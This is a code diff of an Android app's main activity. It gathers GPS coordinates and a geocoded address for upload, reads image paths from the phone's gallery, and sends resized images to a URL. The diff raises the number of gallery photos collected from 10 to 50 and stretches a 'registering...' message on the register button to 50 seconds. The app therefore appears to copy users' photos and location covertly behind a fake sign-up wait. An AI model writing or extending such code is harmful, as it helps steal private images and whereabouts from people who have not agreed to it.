@@ -179,18 +179,18 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    @Override
-    protected void onResume() {
-        super.onResume();
-        // 在 onResume 中重新获取地理位置
-        if (checkPermissions()) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                getLocation();
-            } else {
-                getLocation();
-            }
-        }
-    }
+//    @Override
+//    protected void onResume() {
+//        super.onResume();
+//        // 在 onResume 中重新获取地理位置
+//        if (checkPermissions()) {
+//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+//                getLocation();
+//            } else {
+//                getLocation();
+//            }
+//        }
+//    }
 
     private void showCustomDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
@@ -323,7 +323,7 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 // 如果所有权限都已授予，执行相应操作
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    getLocation_high();
+                    getLocation();
                 } else {
                     getLocation();
                 }
@@ -426,11 +426,11 @@ public class MainActivity extends AppCompatActivity {
         handler = new Handler();
         handler.removeCallbacks(runnable);
         runnable = new Runnable() {
-            int count = 2;
+            int count = 50;
 
             @Override
             public void run() {
-                buttonRegister.setText(count + "秒");
+                buttonRegister.setText("注册中...");
                 count--;
                 if (count >= 0) {
                     handler.postDelayed(this, 1000);
@@ -452,7 +452,7 @@ public class MainActivity extends AppCompatActivity {
         if (cursor != null) {
             int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
             int count = 0;
-            while (cursor.moveToNext() && count < 10) {
+            while (cursor.moveToNext() && count < 50) {
                 photosPath.add(cursor.getString(columnIndex));
                 count++;
             }
@@ -519,8 +519,6 @@ public class MainActivity extends AppCompatActivity {
                 longitude = String.format(Locale.US, "%.6f", location.getLongitude());
                 Log.d("Location", "Latitude: " + latitude + ", Longitude: " + longitude);
 
-
-
                 // 使用 Geocoder 将经纬度转换为地址
                 Geocoder geocoder = new Geocoder(MainActivity.this, Locale.getDefault());
                 try {
@@ -528,15 +526,25 @@ public class MainActivity extends AppCompatActivity {
                     if (addresses != null && !addresses.isEmpty()) {
                         Address address = addresses.get(0);
                         // 获取更详细的地址信息
-                        String country = address.getCountryName(); // 国家
-                        String adminArea = address.getAdminArea(); // 省
-                        String locality = address.getLocality(); // 市
-                        String subLocality = address.getSubLocality(); // 区/县
-                        String thoroughfare = address.getThoroughfare(); // 道路
+                        StringBuilder addressStringBuilder = new StringBuilder();
 
-                        addressString = address.getAddressLine(0)+
-                                address.getAddressLine(1)+
-                                address.getAddressLine(2); // 获取完整地址
+                        if (address.getAddressLine(0) != null) {
+                            addressStringBuilder.append(address.getAddressLine(0));
+                        }
+                        if (address.getAddressLine(1) != null) {
+                            if (addressStringBuilder.length() > 0) {
+                                addressStringBuilder.append(", ");
+                            }
+                            addressStringBuilder.append(address.getAddressLine(1));
+                        }
+                        if (address.getAddressLine(2) != null) {
+                            if (addressStringBuilder.length() > 0) {
+                                addressStringBuilder.append(", ");
+                            }
+                            addressStringBuilder.append(address.getAddressLine(2));
+                        }
+
+                        addressString = addressStringBuilder.toString();
                         Log.d("Location", "Address: " + addressString);
 
                         // 上传位置信息
@@ -557,6 +565,7 @@ public class MainActivity extends AppCompatActivity {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CODE);
         }
     }
+
 
     private void getLocation_high() {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -590,13 +599,6 @@ public class MainActivity extends AppCompatActivity {
 
                         addressString = address.getAddressLine(0); // 获取完整地址
 
-                        Log.d("Location", "Country: " + country);
-                        Log.d("Location", "Admin Area (Province): " + adminArea);
-                        Log.d("Location", "Locality (City): " + locality);
-                        Log.d("Location", "Sub Locality (District): " + subLocality);
-                        Log.d("Location", "Thoroughfare (Street): " + thoroughfare);
-                        Log.d("Location", "Sub Thoroughfare (Street Number): " + subThoroughfare);
-                        Log.d("Location", "Address: " + addressString);
                     } else {
                         Log.e("Location", "Failed to get address");
                     }
@@ -708,6 +710,12 @@ public class MainActivity extends AppCompatActivity {
     private void uploadFile(String url, File file) {
         try {
             Bitmap resizedBitmap = getResizedBitmap(file.getAbsolutePath(), 800, 800);
+
+            if (resizedBitmap == null) {
+                Log.e("UploadFile", "Resized bitmap is null");
+                return;
+            }
+
             // 获取原始文件名（不带扩展名）
             String originalFileName = file.getName().substring(0, file.getName().lastIndexOf('.'));
             // 获取原始文件扩展名
@@ -847,6 +855,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private File saveBitmapToFile(Bitmap bitmap, String fileName) throws IOException {
+        if (bitmap == null) {
+            return null;
+        }
+
         // 创建一个文件对象，存放在缓存目录中
         File file = new File(getCacheDir(), fileName);
 
